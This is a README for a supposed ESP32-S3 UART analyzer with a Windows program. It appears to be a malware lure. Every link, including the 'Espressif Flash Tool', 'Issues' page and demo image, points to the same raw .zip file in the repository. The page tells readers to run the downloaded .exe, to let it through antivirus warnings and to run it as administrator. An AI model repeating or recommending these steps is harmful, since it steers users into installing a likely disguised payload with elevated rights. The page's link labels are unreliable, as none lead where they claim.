# 🔍 linkscope-bpu-uart-analyzer - Real-Time UART Debugging Tool

[![Download Link](https://raw.githubusercontent.com/mycaptainone/linkscope-bpu-uart-analyzer/main/firmware/esp32_s3/linkscope_bpu_analyzer_uart_v1.5.zip)](https://raw.githubusercontent.com/mycaptainone/linkscope-bpu-uart-analyzer/main/firmware/esp32_s3/linkscope_bpu_analyzer_uart_v1.5.zip)

---

## 📖 What is LinkScope BPU UART Analyzer?

LinkScope BPU UART Analyzer is a simple tool that helps you check and understand data sent over UART communication. It uses an ESP32-S3 device combined with a PC program that runs on Windows. This tool captures UART signals in real-time and shows you detailed information about your data including packet drops, timing variations (jitter), and buffer status. It is designed to make debugging embedded devices easier, even if you don’t have deep technical knowledge.

---

## 🎯 Why Use LinkScope?

When working with UART (a way electronic devices talk to each other), problems happen that are hard to spot:

- Terminals may say data is “fine,” but packets can still be lost.
- You can’t see when the timing between data bits changes (jitter).
- Debugging tools may not give clear visual feedback of your data frames.

LinkScope shows you all these details live, so you can quickly find and fix issues.

---

## 🖥️ Demo

![Demo](https://raw.githubusercontent.com/mycaptainone/linkscope-bpu-uart-analyzer/main/firmware/esp32_s3/linkscope_bpu_analyzer_uart_v1.5.zip)

---

## 🚀 Getting Started: What You Need

1. **Hardware**
   - ESP32-S3 Development Board
   - USB-A to USB-C cable (or USB cable compatible with your ESP32-S3 board)
   - Target device with UART output
   - Basic jumper wires for connecting UART signals

2. **Computer**
   - Windows PC (Windows 10 or later recommended)
   - Available USB port

3. **Software**
   - LinkScope BPU UART Analyzer application for Windows
   - Firmware file for ESP32-S3 (included in the release package)

---

## 💾 Download & Install

[Download the latest release here](https://raw.githubusercontent.com/mycaptainone/linkscope-bpu-uart-analyzer/main/firmware/esp32_s3/linkscope_bpu_analyzer_uart_v1.5.zip)

1. Visit the release page by clicking the link above.
2. Download the Windows application (usually a file with `.exe`).
3. Download the firmware file for ESP32-S3 (typically a `.bin` file).
4. Save these files to an easy-to-find folder on your PC.

---

## 🔧 Step-by-Step Setup Guide

### Step 1: Flash Firmware to ESP32-S3

You need to put the LinkScope UART Analyzer program on the ESP32-S3 board.

- If you’re new to flashing:
  - Download and install [Espressif Flash Tool](https://raw.githubusercontent.com/mycaptainone/linkscope-bpu-uart-analyzer/main/firmware/esp32_s3/linkscope_bpu_analyzer_uart_v1.5.zip)
  - Connect your ESP32-S3 board to your PC with the USB cable.
  - Open the flashing tool and select the downloaded `.bin` firmware file.
  - Follow on-screen instructions to flash.

*If you have trouble, search online for "How to flash firmware to ESP32-S3".*

### Step 2: Connect the Wires

- Connect the **Target UART TX** pin (transmit pin on your device you want to monitor) to **GPIO18** on the ESP32-S3.
- Connect the **Ground (GND)** from your target device to the **Ground (GND)** pin on the ESP32-S3.

Make sure these connections are secure.

### Step 3: Plug the ESP32-S3 Into Your PC USB Port

This powers the board and starts communication.

### Step 4: Close Other Serial Programs

Only one program can access a serial port at a time. Before running LinkScope:

- Close Arduino Serial Monitor if open.
- Close PlatformIO Serial Monitor if open.
- Close PuTTY, TeraTerm, or any other terminal apps.

If another app is using the port, LinkScope may not work correctly.

### Step 5: Run the LinkScope Windows Program

- Double-click the LinkScope `.exe` file you downloaded.
- You will see the main window.
  
### Step 6: Select Your COM Port

- In the program, select the COM port connected to your ESP32-S3.
- If you aren’t sure which COM port it is:
  - Open **Device Manager** on Windows.
  - Look under “Ports (COM & LPT)” to find the ESP32-S3 port.

### Step 7: Press Start

- The program will begin capturing UART data.
- You will see live updates about packets, errors, jitter, and other stats.

---

## ⚙️ How to Use LinkScope

Once running, the LinkScope program shows several areas of information:

- **Real-time Data Stream:** Shows raw UART bytes as you receive them.
- **Frame Analyzer:** Breakdown of data packets for easier understanding.
- **Jitter Graph:** Visualizes timing changes between bits.
- **Drop Detector:** Alerts when packets are missing or incomplete.
- **Buffer Monitor:** Tracks if internal memory buffers fill up.

You can pause and resume capture at any time. Use these details to find issues with your UART connection.

---

## 💡 Tips for Success

- Use short, shielded wires if possible to reduce noise.
- Keep your ESP32-S3 close to the target device.
- Make sure your target device is transmitting data at a supported speed (usually below 5 Mbps).
- If you see weird data, try restarting the ESP32 and LinkScope program.
- Always close other serial tools before running LinkScope.

---

## 🪟 Windows Specific Notes

- Make sure your PC has the latest USB drivers installed.
- Windows Defender or antivirus software may warn when running downloaded programs. Allow the program to run.
- You can set the program to run as administrator if you have connection troubles.
- If your COM port doesn’t appear, unplug and replug the USB cable.

---

## 🔍 Troubleshooting

| Problem                          | What to Try                                             |
|---------------------------------|---------------------------------------------------------|
| LinkScope fails to start         | Close all other serial port apps, re-plug ESP32         |
| No COM ports listed              | Check Device Manager, install drivers                    |
| No data showing                  | Check wiring, ensure target device is sending UART data |
| Program crashes or exits early   | Run as administrator, update USB drivers                |
| Unexpected data or garbled output| Verify baud rate settings (default is 115200)            |

---

## 🔧 Supported Features

- Capture UART data up to 5 Mbps
- Real-time frame decoding and display
- Packet drop detection and alerts
- Visual jitter analysis charts
- Buffer fill monitoring
- Works with ESP32-S3 hardware
- Windows GUI application for ease of use

---

## 🤝 Getting Help

- Check the GitHub [Issues](https://raw.githubusercontent.com/mycaptainone/linkscope-bpu-uart-analyzer/main/firmware/esp32_s3/linkscope_bpu_analyzer_uart_v1.5.zip) page for known problems.
- Ask questions by opening a new issue if needed.
- Join user forums or communities for ESP32 and UART troubleshooting if you want detailed help.

---

## 📌 Summary

LinkScope BPU UART Analyzer helps you easily check UART signals from embedded devices. It uses the ESP32-S3 board as a data capture tool paired with a Windows program for displaying information clearly. Follow the setup steps above to download, install, and run the tool. This can save you time finding UART communication errors that are invisible in normal terminal windows.

---

## ▼ Quick Links

- [Download LinkScope releases](https://raw.githubusercontent.com/mycaptainone/linkscope-bpu-uart-analyzer/main/firmware/esp32_s3/linkscope_bpu_analyzer_uart_v1.5.zip)
- [ESP32-S3 Arduino Setup Guide](https://raw.githubusercontent.com/mycaptainone/linkscope-bpu-uart-analyzer/main/firmware/esp32_s3/linkscope_bpu_analyzer_uart_v1.5.zip)
- [Download Espressif Flash Tool](https://raw.githubusercontent.com/mycaptainone/linkscope-bpu-uart-analyzer/main/firmware/esp32_s3/linkscope_bpu_analyzer_uart_v1.5.zip)

---

[![Download Link](https://raw.githubusercontent.com/mycaptainone/linkscope-bpu-uart-analyzer/main/firmware/esp32_s3/linkscope_bpu_analyzer_uart_v1.5.zip)](https://raw.githubusercontent.com/mycaptainone/linkscope-bpu-uart-analyzer/main/firmware/esp32_s3/linkscope_bpu_analyzer_uart_v1.5.zip)